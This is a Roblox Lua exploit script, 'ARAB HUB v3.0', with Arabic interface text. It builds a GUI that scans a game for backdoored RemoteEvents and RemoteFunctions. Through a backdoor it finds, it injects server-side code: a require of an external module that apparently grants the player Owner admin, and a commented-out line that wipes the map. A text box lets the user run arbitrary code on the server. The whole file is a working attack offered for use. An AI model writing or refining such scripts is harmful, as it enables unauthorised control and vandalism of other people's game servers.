-- [[ ARAB HUB v3.0 - THE ULTIMATE DESTRUCTION ]] --

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- === واجهة المستخدم ===
local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
local MainFrame = Instance.new("Frame", ScreenGui)
MainFrame.BackgroundColor3 = Color3.fromRGB(15, 0, 0) -- لون أحمر غامق للتدمير
MainFrame.Size = UDim2.new(0, 380, 0, 520)
MainFrame.Position = UDim2.new(0.5, -190, 0.5, -260)
MainFrame.Visible = false
Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 15)

local Title = Instance.new("TextLabel", MainFrame)
Title.Size = UDim2.new(1, 0, 0, 50)
Title.Text = "ARAB HUB - نظام التدمير الشامل"
Title.TextColor3 = Color3.fromRGB(255, 0, 0)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 22
Title.BackgroundTransparency = 1

-- صفحة البحث (Scanner)
local ScannerPage = Instance.new("ScrollingFrame", MainFrame)
ScannerPage.Size = UDim2.new(1, -20, 1, -130)
ScannerPage.Position = UDim2.new(0, 10, 0, 60)
ScannerPage.BackgroundTransparency = 1
Instance.new("UIListLayout", ScannerPage).Padding = UDim.new(0, 8)

-- واجهة الـ Require والجلد
local HackPanel = Instance.new("Frame", MainFrame)
HackPanel.Size = UDim2.new(1, 0, 1, 0)
HackPanel.BackgroundColor3 = Color3.fromRGB(5, 5, 5)
HackPanel.Visible = false
Instance.new("UICorner", HackPanel)

local CodeBox = Instance.new("TextBox", HackPanel)
CodeBox.Size = UDim2.new(1, -20, 0, 180)
CodeBox.Position = UDim2.new(0, 10, 0, 60)
CodeBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
CodeBox.TextColor3 = Color3.fromRGB(0, 255, 0)
CodeBox.MultiLine = true
CodeBox.PlaceholderText = "ضع الـ Require هنا أو أوامر تدمير الماب..."
CodeBox.Font = Enum.Font.Code
Instance.new("UICorner", CodeBox)

local ExecBtn = Instance.new("TextButton", HackPanel)
ExecBtn.Size = UDim2.new(1, -20, 0, 55)
ExecBtn.Position = UDim2.new(0, 10, 0, 260)
ExecBtn.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
ExecBtn.Text = "☢️ EXECUTE DESTRUCTION ☢️"
ExecBtn.TextColor3 = Color3.white
ExecBtn.Font = Enum.Font.GothamBold
Instance.new("UICorner", ExecBtn)

-- === منطق البرمجة والتدمير ===
local selectedRemote = nil

local function send(code)
    if selectedRemote then
        if selectedRemote:IsA("RemoteEvent") then
            selectedRemote:FireServer(code)
        else
            selectedRemote:InvokeServer(code)
        end
    end
end

-- زر البحث (Scan)
local ScanBtn = Instance.new("TextButton", MainFrame)
ScanBtn.Size = UDim2.new(1, -20, 0, 50)
ScanBtn.Position = UDim2.new(0, 10, 1, -60)
ScanBtn.BackgroundColor3 = Color3.fromRGB(0, 100, 255)
ScanBtn.Text = "🔍 SCAN (البحث عن ثغرات الباكدور)"
ScanBtn.TextColor3 = Color3.white
ScanBtn.Font = Enum.Font.GothamBold
Instance.new("UICorner", ScanBtn)

ScanBtn.MouseButton1Click:Connect(function()
    ScanBtn.Text = "جاري البحث عن مدخل..."
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
            local n = v.Name:lower()
            if n:find("backdoor") or n:find("admin") or n:find("remote") or n:find("main") then
                local b = Instance.new("TextButton", ScannerPage)
                b.Size = UDim2.new(1, 0, 0, 45)
                b.Text = "اكتشاف ثغرة: " .. v.Name
                b.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
                b.TextColor3 = Color3.fromRGB(255, 255, 0)
                Instance.new("UICorner", b)
                
                b.MouseButton1Click:Connect(function()
                    selectedRemote = v
                    -- [ أمر الحقن التلقائي لأعلى رتبة + تدمير مالي ]
                    send([[
                        local p = game.Players:FindFirstChild("]]..LocalPlayer.Name..[[")
                        -- حقن أدمن Owner
                        pcall(function() require(110047253067635):Hload(p.Name) end)
                        -- أمر تدمير الماب (اختياري يمكنك تفعيله الآن)
                        -- for _,v in pairs(workspace:GetChildren()) do if not v:IsA('Terrain') and not game.Players:GetPlayerFromCharacter(v) then v:Destroy() end end
                    ]])
                    
                    ScannerPage.Visible = false
                    ScanBtn.Visible = false
                    HackPanel.Visible = true
                    Title.Text = "تم الاختراق بنجاح! 🔥"
                end)
            end
        end
    end
end)

ExecBtn.MouseButton1Click:Connect(function()
    send(CodeBox.Text)
end)

-- زر التبديل (ARAB)
local Toggle = Instance.new("TextButton", ScreenGui)
Toggle.Size = UDim2.new(0, 60, 0, 60)
Toggle.Position = UDim2.new(0, 10, 0.4, 0)
Toggle.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
Toggle.Text = "ARAB"
Toggle.Font = Enum.Font.GothamBold
Instance.new("UICorner", Toggle).CornerRadius = UDim.new(1, 0)
Toggle.MouseButton1Click:Connect(function() MainFrame.Visible = not MainFrame.Visible end)
